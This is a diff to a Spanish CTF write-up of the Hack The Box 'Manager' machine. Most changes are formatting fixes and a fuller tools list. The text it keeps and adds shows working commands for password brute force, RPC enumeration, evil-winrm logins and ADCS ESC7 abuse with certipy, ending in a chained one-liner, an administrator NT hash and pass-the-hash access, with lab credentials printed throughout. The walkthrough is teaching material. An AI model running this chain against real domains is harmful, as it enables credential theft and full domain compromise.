@@ -19,8 +19,9 @@ tags:
   - RPC
   - LDAP
   - MSSQL
-  - Web Enumerations
+  - Web Enumeration
   - Kerberos Enumeration
+  - Password Brute Force
   - RPC Enumeration
   - LDAP Enumeration
   - RID Cycling Attack
@@ -29,7 +30,7 @@ tags:
   - Information Leakage
   - AD Enumeration (adPEAS)
   - BloodHound and SharpHound Enumeration
-  - Abusing ADCS (SubCA template)
+  - Abusing ADCS (SubCA Template)
   - Privesc - ESC7 technique
   - OSCP Style
 ---
@@ -44,18 +45,27 @@ Herramientas utilizadas:
 * *whatweb*
 * *wfuzz*
 * *gobuster*
-* **
-* **
-* **
-* **
-* **
-* **
-* **
-* **
-* **
-* **
-* **
-* **
+* *dig*
+* *crackmapexec*
+* *smbclient*
+* *smbmap*
+* *kerbrute_linux_amd64*
+* *impacket-GetNPUsers*
+* *impacket-GetUserSPNs*
+* *rpcclient*
+* *ldapdomaindump*
+* *python3*
+* *seq*
+* *xargs*
+* *netexec*
+* *impacket-mssqlclient*
+* *xp_dirtree*
+* *adPEAS*
+* *BloodHound 4.3.1*
+* *SharpHound 1.1.1*
+* *evil-winrm*
+* *certipy*
+* *ntpdate*
 
 
 <br>
@@ -76,19 +86,19 @@ Herramientas utilizadas:
 				<li><a href="#DNS">Enumeración de DNS</a></li>
 				<li><a href="#SMB">Enumeración de Servicio SMB</a></li>
 				<li><a href="#kerberos">Enumeración de Servicio Kerberos</a></li>
-				<ul>
-					<li><a href="#FBruta">Aplicando Fuerza Bruta con crackmapexec a Usuarios Encontrados</a></li>
-					<li><a href="#ASREP">Aplicando AS-REP Roasting attack (Fallo)</a></li>
-					<li><a href="#kerberoasting">Aplicando Kerberoasting Attack (Fallo)</a></li>
-				</ul>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
+				<li><a href="#FBruta">Aplicando Fuerza Bruta con crackmapexec a Usuarios Encontrados</a></li>
+				<ul>
+					<li><a href="#ASREP">Aplicando AS-REP Roasting attack (Fallo)</a></li>
+                                        <li><a href="#kerberoasting">Aplicando Kerberoasting Attack (Fallo)</a></li>
+				</ul>
 				<li><a href="#RPC">Enumeración de Servicio RPC</a></li>
 				<li><a href="#LDAP">Enumeración de Servicio LDAP con ldapdomaindump</a></li>
 				<li><a href="#RID">Aplicando RID Cycling Attack para Enumeración de Usuarios con crackmapexec y rpcclient</a></li>
 				<li><a href="#netexec">Probando Credenciales Válidas con netexec</a></li>
-				<li><a href="#MSSQL">Enumeración de Archivos del Sistema con xp_dirtree</a></li>
+				<li><a href="#MSSQL">Enumeración de Servicio MSSQL</a></li>
 				<li><a href="#XPdirtree">Enumeración de Archivos del Sistema con xp_dirtree</a></li>
 				<ul>
 					<li><a href="#ZIP">Analizando Contenido de Archivo ZIP y Ganando Acceso a la Máquina con Evil-WinRM</a></li>
@@ -642,9 +652,17 @@ Tenemos varios usuarios. Cópialos en minúsculas para evitar errores.
 
 Como ya tenemos usuarios válidos, podemos aplicar varias cosillas. Lo principal es ver si no se está ocupando el nombre de un usuario como su contraseña.
 
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+  <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
+</div>
 <br>
 
-<h3 id="FBruta">Aplicando Fuerza Bruta con crackmapexec a Usuarios Encontrados</h3>
+
+<h2 id="FBruta">Aplicando Fuerza Bruta con crackmapexec a Usuarios Encontrados</h2>
 
 Podríamos usar **kerbrute** para probar qué usuario tiene su nombre de usuario como contraseña, pero para más rapidez, vamos a usar **crackmapexec**.
 
@@ -700,7 +718,7 @@ Aunque de aquí no obtendremos nada.
 
 <br>
 
-<h3 id="">Aplicando AS-REP Roasting attack (Fallo)</h3>
+<h3 id="ASREP">Aplicando AS-REP Roasting attack (Fallo)</h3>
 
 De igual forma, como ya tenemos una lista de usuarios, podemos aplicar el **AS-REP Roasting attack** y ver si obtenemos el **hash** de un **TGT** de algún usuario.
 
@@ -720,7 +738,7 @@ Nada, fue un fallo aplicar este ataque.
 
 <br>
 
-<h3 id=""> Aplicando Kerberoasting Attack (Fallo)</h3>
+<h3 id="kerberoasting"> Aplicando Kerberoasting Attack (Fallo)</h3>
 
 Como ya tenemos un usuario y contraseña válido, podemos intentar aplicar el **Kerberoasting Attack** para poder obtener un **TGS** e intentar crackearlo.
 
@@ -779,7 +797,7 @@ user:[Operator] rid:[0x45f]
 Son 7 usuarios que existen (aparte de los usuarios del sistema por defecto).
 
 Obtengamos los grupos:
-```bash
+```batch
 rpcclient $> enumdomgroups
 group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
 group:[Domain Admins] rid:[0x200]
@@ -800,7 +818,7 @@ group:[DnsUpdateProxy] rid:[0x44e]
 No veo algún grupo que se vea vulnerable.
 
 Veamos si hay más usuarios administradores:
-```bash
+```batch
 rpcclient $> querygroup 0x200
         Group Name:     Domain Admins
         Description:    Designated administrators of the domain
@@ -952,7 +970,7 @@ lookupnames_level               Convert names to SIDs
 Ahí lo tenemos.
 
 Probemos primero con el comando **lookupnames** para buscar al administrador en la sesión nula:
-```bash
+```batch
 rpcclient -U "" 10.10.11.236 -N -c "lookupnames administrator"
 result was NT_STATUS_ACCESS_DENIED
 ```
@@ -1117,15 +1135,6 @@ Es bueno tener otra opción con la que podamos trabajar contra servicios que nos
 Aquí puedes encontrar ejemplos de uso para esta herramienta:
 * <a href="https://medium.com/@nantysean/enumerating-a-corporate-network-with-netexec-7be7537b537d" target="_blank">Enumerating a Corporate Network with NetExec</a>
 
-
-<br>
-<br>
-<hr>
-<div style="position: relative;">
-  <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-</div>
-<br>
-
 <h2 id="MSSQL">Enumeración de Servicio MSSQL</h2>
 
 Como ya vimos que el usuario y contraseña **operator** se pueden usar en el **servicio MSSQL**, vamos a entrar a este servicio usando la herramienta **mssqlclient de impacket**.
@@ -1232,7 +1241,7 @@ Tenemos 4 usuarios, pero no hay manera de suplantarlos de momento.
 
 Como nos vamos quedando sin opciones, podemos utilizar la herramienta **xp_dirtree** para enumerar los archivos del sistema a los que tenga permiso el **usuario operator**.
 
-<h2 id="">Enumeración de Archivos del Sistema con xp_dirtree</h2>
+<h2 id="XPdirtree">Enumeración de Archivos del Sistema con xp_dirtree</h2>
 
 | **xp_dirtree** |
 |:-----------:|
@@ -1406,7 +1415,7 @@ WINRM       10.10.11.236    5985   DC01             [+] manager.htb\raven:R4v3nB
 Muy bien, si funciona.
 
 Entremos a la máquina usando **Evil-WinRM**:
-```bash
+```batch
 evil-winrm -i 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'
                                         
 Evil-WinRM shell v3.5
@@ -1418,7 +1427,7 @@ manager\raven
 Estamos dentro.
 
 Busca la flag:
-```bash
+```batch
 *Evil-WinRM* PS C:\Users\Raven\Documents> cd ../Desktop
 *Evil-WinRM* PS C:\Users\Raven\Desktop> dir
 
@@ -1444,14 +1453,14 @@ Tenemos la flag del usuario.
 
 <h2 id="adPEAS">Enumeración de AD con adPEAS</h2>
 
-Como siempre, la idea es enumerar el AD con **BloodHound y SharpHound** para encontrar un vector de ataque que nos ayude a escalar privielgios, pero en este caso, vamos a usar la herramienta **adPEAS**, que es similar a los PEAS que enumeran la máquina y encuentran vulnerabilidades.
+Como siempre, la idea es enumerar el **AD** con **BloodHound y SharpHound** (lo haremos más adelante también) para encontrar un vector de ataque que nos ayude a escalar privilegios, pero en este caso, vamos a usar la herramienta **adPEAS**, que es similar a los **PEAS** que enumeran la máquina y encuentran vulnerabilidades.
 
 Lo puedes obtener aquí:
 * <a href="https://github.com/61106960/adPEAS" target="_blank">Repositorio de 61106960: adPEAS</a>
 
-Una vez que lo tengas, cargalo a la sesión de **Evil-WinRM**.
+Una vez que lo tengas, cárgalo a la sesión de **Evil-WinRM**.
 
-Ya sabes que hay 2 formas de hacerlo, yo lo cargue usando **Evil-WinRM**:
+Ya sabes que hay 2 formas de hacerlo, yo lo cargué usando **Evil-WinRM**:
 ```batch
 *Evil-WinRM* PS C:\Users\Raven\Documents> upload adPEAS/adPEAS.ps1
                                         
@@ -1510,16 +1519,16 @@ EnrollmentFlag:                         0
 ```
 Analiza bien el resultado.
 
-No muestra que hay una plantila de un certificado que es vulnerable y nos menciona que podemos usar la herramienta **certify o certipy**, para explotar esta vulnerabilidad.
+Nos muestra que hay una plantilla de un certificado que es vulnerable. La plantilla se llama **SubCA** y nos menciona que podemos usar la herramienta **certify o certipy**, para explotar esta vulnerabilidad.
 
 En mi caso, voy a usar **certipy**.
 
 <h2 id="BloodH">Enumeración de AD con BloodHound y SharpHound</h2>
 
-Aunque ya tenemos una vulnerabilidad que podemos explotar, vamos a probar que podemos obtener con **BloodHound y SharpHound**.
+Aunque ya tenemos una vulnerabilidad que podemos explotar, vamos a probar qué podemos obtener con **BloodHound y SharpHound**.
 
 Carga **SharpHound** a la sesión actual:
-```bash
+```batch
 *Evil-WinRM* PS C:\Users\Raven\Documents\BH> upload SharpHound.exe
                                         
 Info: Uploading ../content/SharpHound.exe to C:\Users\Raven\Documents\BH\SharpHound.exe
@@ -1529,8 +1538,8 @@ Data: 1402880 bytes of 1402880 bytes copied
 Info: Upload successful!
 ```
 
-Ejecutalo:
-```bash
+Ejecútalo:
+```batch
 *Evil-WinRM* PS C:\Users\Raven\Documents\BH> .\SharpHound.exe -c All
 2024-10-13T23:15:42.4798539-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
 2024-10-13T23:15:42.6673525-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
@@ -1554,7 +1563,7 @@ Closing writers
 2024-10-13T23:16:28.4954797-07:00|INFORMATION|SharpHound Enumeration Completed at 11:16 PM on 10/13/2024! Happy Graphing!
 ```
 
-Una vez que descargues el **archivo ZIP** resultante de usar **SharpHound**, cargalo al **BloodHound**:
+Una vez que descargues el **archivo ZIP** resultante de usar **SharpHound**, cárgalo al **BloodHound**:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-manager/Captura9.png">
@@ -1562,7 +1571,7 @@ Una vez que descargues el **archivo ZIP** resultante de usar **SharpHound**, car
 
 Investigando un poco con lo que obtuvimos, descubrí que no hay un vector de ataque que podamos usar.
 
-Observa la información que obtuvimos del usuario raven del que tenemos su contraseña:
+Observa la información que obtuvimos del **usuario raven** del que tenemos su contraseña:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-manager/Captura10.png">
@@ -1586,9 +1595,9 @@ Ese grupo no tiene un privilegio del que nos podamos aprovechar:
 <img src="/assets/images/htb-writeup-manager/Captura13.png">
 </p>
 
-Entonces, en caso de no encontrar algo que nos ayude a escalar privilegios vía **BloodHound**, es bueno usar **adPEAS** como segunda opción y también revisar las plantillas de certificación del AD.
+Entonces, en caso de no encontrar algo que nos ayude a escalar privilegios vía **BloodHound**, es bueno usar **adPEAS** como segunda opción y también revisar las plantillas de certificación del **AD**.
 
-<h2 id="ADCS">Abusando de ADCS: Explotando Permiso ManageCA de Usuario Raven Aplicandole la Técnica ESC7 con certipy</h2>
+<h2 id="ADCS">Abusando de ADCS: Explotando Permiso ManageCA de Usuario Raven Aplicándole la Técnica ESC7 con certipy</h2>
 
 Primero que nada, ¿Qué es **ADCS**?
 
@@ -1605,7 +1614,7 @@ De aquí la puede obtener:
 
 Una vez que ya lo tengas instalado o compilado, lo primero que podemos hacer es probarlo usando las credenciales que tenemos.
 
-Primero usaremos el comando **find** de **certipy**, añadiendo las credenciales, la IP de la máquina (-dc-ip), le indicaremos que muestre sólo plantillas de certificados vulnerables basadas en pertenencias a grupos anidados (-vulnerable) y que muestre el resultado en la terminal al finalizar (-stdout):
+Primero usaremos el comando **find** de **certipy**, añadiendo las credenciales y la IP de la máquina (`-dc-ip`), le indicaremos que muestre solo plantillas de certificados vulnerables basadas en pertenencias a grupos anidados (`-vulnerable`) y que muestre el resultado en la terminal al finalizar (`-stdout`):
 ```bash
 certipy find -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -vulnerable -stdout
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -1649,7 +1658,7 @@ Certificate Templates                   : [!] Could not find any certificate tem
 ```
 Nos dio un resultado.
 
-Parece que nuestro **usurio raven** tiene permisos que nos pueden permitir escalar privilegios, pues esta dentro de los permisos **ManageCa** del **Certificate Authorities**.
+Parece que nuestro **usurio raven** tiene permisos que nos pueden permitir escalar privilegios, pues está dentro de los permisos **ManageCa** del **Certificate Authorities**.
 
 Investiguemos estos dos conceptos:
 
@@ -1667,11 +1676,11 @@ Investiguemos estos dos conceptos:
 
 Creo que queda claro que es un **CA y el permiso ManageCA**.
 
-En la respues que obtuvimos, nos indica que hay una técnica que podemos usar para explotar esta vulnerabilidad, que sería el **ESC7 (Escalada 7)** y que podemos ver sus instrucciones en el **GitHub**.
+En la respuesta que obtuvimos, nos indica que hay una técnica que podemos usar para explotar esta vulnerabilidad, que sería el **ESC7 (Escalada 7)** y que podemos ver sus instrucciones en el **GitHub**.
 
-La idea es simple, vamos a suplantar al usuario administrador para generar un certificado que nos permita obtener el hash NTLM del administrador.
+La idea es simple: vamos a suplantar al usuario administrador para generar un certificado que nos permita obtener el **hash NT** del administrador.
 
-Lo malo, es que tendremos que ser rapidos, pues cuando intentemos generar ese certificado, se puede llegar a reiniciar y tendríamos que hacer los pasos desde el principio.
+Lo malo, es que tendremos que ser rápidos, pues cuando intentemos generar ese certificado, se puede llegar a reiniciar y tendríamos que hacer los pasos desde el principio.
 
 <br>
 
@@ -1683,7 +1692,7 @@ Lo malo, es que tendremos que ser rapidos, pues cuando intentemos generar ese ce
 
 <br>
 
-Para que podamos aplicar esta técnica, necesitamos que el usuario tenga el permiso **ManageCA** (que si tiene), tenga el permiso **Manage Certificates** y que este habilitada la plantilla **SubCA** (que igual la tiene activa).
+Para que podamos aplicar esta técnica, necesitamos que el usuario tenga el permiso **ManageCA** (que sí tiene), tenga el permiso **Manage Certificates** y que esté habilitada la plantilla **SubCA** (que igual la tiene activa).
 
 En nuestro caso, nos falta el permiso **Manage Certificates**, por lo que primero debemos agregar nuestro usuario como un nuevo oficial que tenga ese permiso faltante.
 
@@ -1694,7 +1703,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Successfully added officer 'Raven' on 'manager-DC01-CA'
 ```
-Quedo agregado. Ahora si cumplimos con los prerequisitos de la técnica.
+Quedo agregado. Ahora sí cumplimos con los pre requisitos de la técnica.
 
 Empezamos el ataque.
 
@@ -1733,14 +1742,14 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Loaded private key from '26.key'
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
-Excelente, hemos concluido el ataque con exito.
+Excelente, hemos concluido el ataque con éxito.
 
 En caso de que tengas algún error por el tiempo que toma realizar este ataque, puedes usar este oneliner que ejecuta todos los pasos que hemos hecho, solo identifica bien el número del **Request ID** que podrías obtener, ya que es el único dato que hay que cambiar en caso de que falle:
 ```bash
 certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' && certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb && certipy ca -ca 'manager-DC01-CA' -issue-request <requestID> -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' && certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -retrieve <requestID>
 ```
 
-Aquí te dejo un ejemplo de como me funciono el oneliner:
+Aquí te dejo un ejemplo de cómo funciona el oneliner:
 ```bash
 certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' && certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb && certipy ca -ca 'manager-DC01-CA' -issue-request 23 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' && certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -retrieve 23
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -1768,7 +1777,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 ```
 Continuemos.
 
-Antes de aplicar la última parte del ataque, siempre es necesario que nuestra máquina tenga el mismo horario que la máquina víctima, pues así es el funcionamiento del **servicio Kerberos**, ya que si no estan sincronizados con el mismo horario, pueden fallar muchos ataques y este en particular.
+Antes de aplicar la última parte del ataque, siempre es necesario que nuestra máquina tenga el mismo horario que la máquina víctima, pues así es el funcionamiento del **servicio Kerberos**, ya que si no están sincronizados con el mismo horario, pueden fallar muchos ataques y este en particular.
 
 Para tener el mismo horario, usaremos el comando **ntpdate** y le indicamos el nombre del servidor de la máquina víctima:
 ```bash
@@ -1776,11 +1785,11 @@ ntpdate -u dc01.manager.htb
 2024-10-13 06:04:27.985161 (-0600) +25209.632306 +/- 0.034093 dc01.manager.htb 10.10.11.236 s1 no-leap
 CLOCK: time stepped by 25209.632306
 ```
-Ya estan sincronizados.
+Ya están sincronizados.
 
 Para que podamos obtener el **hash NT** del certificado del administrador que ya creamos, usaremos el comando **auth**.
 
-Este comando, utilizará la extensión **PKINIT Kerberos** o el **protocolo Schannel** para la autenticación con el certificado proporcionado. **Kerberos** se puede utilizar para recuperar un **TGT** y el **hash NT** para el usuario de destino, mientras que **Schannel** abrirá una conexión a **LDAPS** y caerá en un shell interactivo con comandos **LDAP** limitados.
+Este comando utilizará la extensión **PKINIT Kerberos** o el **protocolo Schannel** para la autenticación con el certificado proporcionado. **Kerberos** se puede utilizar para recuperar un **TGT** y el **hash NT** para el usuario de destino, mientras que **Schannel** abrirá una conexión a **LDAPS** y caerá en un shell interactivo con comandos **LDAP** limitados.
 
 Por defecto, **Certipy** intentará extraer el nombre de usuario y el dominio del certificado (`-pfx`) para la **autenticación vía Kerberos**.
 
@@ -1796,7 +1805,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
 ```
-Tenemos el **hash NT**, podemos aplicar el **ataque pass-The-hash**, pero hay que comprobar si en verdad nos sirve este hash.
+Tenemos el **hash NT**, podemos aplicar el **ataque pass-The-hash**, pero hay que comprobar si en verdad nos sirve este **hash**.
 
 Lo comprobaremos con **crackmapexec**:
 ```bash
@@ -1813,11 +1822,10 @@ SMB         10.10.11.236    5985   DC01             [*] Windows 10 / Server 2019
 HTTP        10.10.11.236    5985   DC01             [*] http://10.10.11.236:5985/wsman
 WINRM       10.10.11.236    5985   DC01             [+] manager.htb\administrator:ae5064c2f62317332c88629e025924ef (Pwn3d!)
 ```
-Igula funciona.
-
+Igual funciona.
 
 Si bien podemos usar **PsExec**, también podemos usar **Evil-WinRM** para conectarnos como el administrador y buscar la flag:
-```bash
+```batch
 evil-winrm -i 10.10.11.236 -u 'administrator' -H 'ae5064c2f62317332c88629e025924ef'
                                         
 Evil-WinRM shell v3.5
@@ -1828,9 +1836,7 @@ manager\administrator
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
 
-
     Directory: C:\Users\Administrator\Desktop
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -1851,11 +1857,16 @@ Con esto, hemos completado la máquina.
 * https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/rid-cycling
 * https://www.thehacker.recipes/ad/recon/ms-rpc
 * https://medium.com/@nantysean/enumerating-a-corporate-network-with-netexec-7be7537b537d
+* https://github.com/ropnop/kerbrute
 * https://www.sqlops.com/what-is-xp_dirtree/
 * https://github.com/61106960/adPEAS
 * https://github.com/ly4k/Certipy
 * https://www.reddit.com/r/hackthebox/comments/121sn0q/getting_time_skew_error_when_trying_to_run_psexec/
 * https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069
+* https://learn.microsoft.com/es-es/windows-server/identity/ad-cs/active-directory-certificate-services-overview
+* https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation
+* https://www.tarlogic.com/es/blog/ad-cs-ataque-esc7/
+* https://learn.microsoft.com/es-es/windows-server/identity/ad-cs/certification-authority-role
 
 
 <br>
